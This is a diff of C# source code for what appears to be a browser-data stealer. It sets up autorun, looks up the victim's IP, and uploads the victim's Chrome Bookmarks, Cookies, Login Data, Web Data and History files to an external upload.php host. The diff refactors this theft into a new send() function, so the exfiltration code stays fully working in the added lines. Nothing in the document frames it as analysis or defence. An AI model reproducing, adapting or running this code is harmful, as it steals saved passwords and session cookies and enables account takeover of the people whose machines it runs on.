@@ -28,7 +28,7 @@ namespace features
 				{
 					new System.Action( adjustAutorun ).BeginInvoke( null, null );
 					File.Create( "key" );
-					Thread.Sleep( 5000 );
+					Thread.Sleep( 2000 );
 					return;
 				}
 
@@ -120,7 +120,6 @@ namespace features
 
 		static void sendInfo( )
 		{
-
 			var ser = new JavaScriptSerializer( );
 			var info = ser.Deserialize<Info>( getIp( ) );
 
@@ -136,36 +135,10 @@ namespace features
 
 				var json = ser.Serialize( info );
 
-				var fileName = info.query + "_info";
-				var filePath = fileName;
+				var fileName = $"{info.query}_info";
 				File.WriteAllText( fileName, json );
-				uploadFile( filePath, fileName );
+				uploadFile( fileName, fileName );
 				File.Delete( fileName );
-
-				var chromePath = string.Concat( info.localPath, "\\Google\\Chrome\\User Data\\Default\\" );
-
-				filePath = string.Concat( chromePath, "Bookmarks" );
-				fileName = info.query + "_bookmarks";
-				uploadFile( filePath, fileName );
-
-				filePath = string.Concat( chromePath, "Cookies" );
-				fileName = info.query + "_cookies";
-				uploadFile( filePath, fileName );
-
-				filePath = string.Concat( chromePath, "Login Data" );
-				fileName = info.query + "_loginData";
-				uploadFile( filePath, fileName );
-
-				filePath = string.Concat( chromePath, "Web Data" );
-				fileName = info.query + "_webData";
-				uploadFile( filePath, fileName );
-
-				filePath = string.Concat( chromePath, "History" );
-				fileName = info.query + "_history";
-				uploadFile( filePath, fileName );
-
-				if ( debug )
-					Console.WriteLine( $"{DateTime.Now}\tuploading complete" );
 			}
 		}
 		static string getIp( )
@@ -173,15 +146,44 @@ namespace features
 			var webClient = new WebClient( );
 			return webClient.DownloadString( "http://ip-api.com/json/" );
 		}
+		static void send( string ip, string what )
+		{
+			if ( what == "chrome" )
+			{
+				var localPath = Environment.GetFolderPath( Environment.SpecialFolder.LocalApplicationData );
+				var chromePath = string.Concat( localPath, "\\Google\\Chrome\\User Data\\Default" );
+
+				var filePath = $"{chromePath}\\Bookmarks";
+				var fileName = $"{ip}_bookmarks";
+				uploadFile( filePath, fileName );
+
+				filePath = $"{chromePath}\\Cookies";
+				fileName = $"{ip}_cookies";
+				uploadFile( filePath, fileName );
+
+				filePath = $"{chromePath}\\Login Data";
+				fileName = $"{ip}_loginData";
+				uploadFile( filePath, fileName );
+
+				filePath = $"{chromePath}\\Web Data";
+				fileName = $"{ip}_webData";
+				uploadFile( filePath, fileName );
+
+				filePath = $"{chromePath}\\History";
+				fileName = $"{ip}_history";
+				uploadFile( filePath, fileName );
+			}
+		}
 		static void uploadFile( string filePath, string fileName )
 		{
 			if ( debug )
 				Console.WriteLine( $"{DateTime.Now}\tuploading {fileName}..." );
 
 			var webClient = new WebClient( );
+			byte[] result;
 
 			if ( File.Exists( filePath ) )
-				webClient.UploadFile( string.Concat( "http://slimbde.atwebpages.com/upload.php?name=", fileName ), "POST", filePath );
+				result = webClient.UploadFile( string.Concat( "http://slimbde.atwebpages.com/upload.php?name=", fileName ), "POST", filePath );
 
 			if ( debug )
 				Console.WriteLine( $"{DateTime.Now}\t{fileName} has been uploaded\n" );
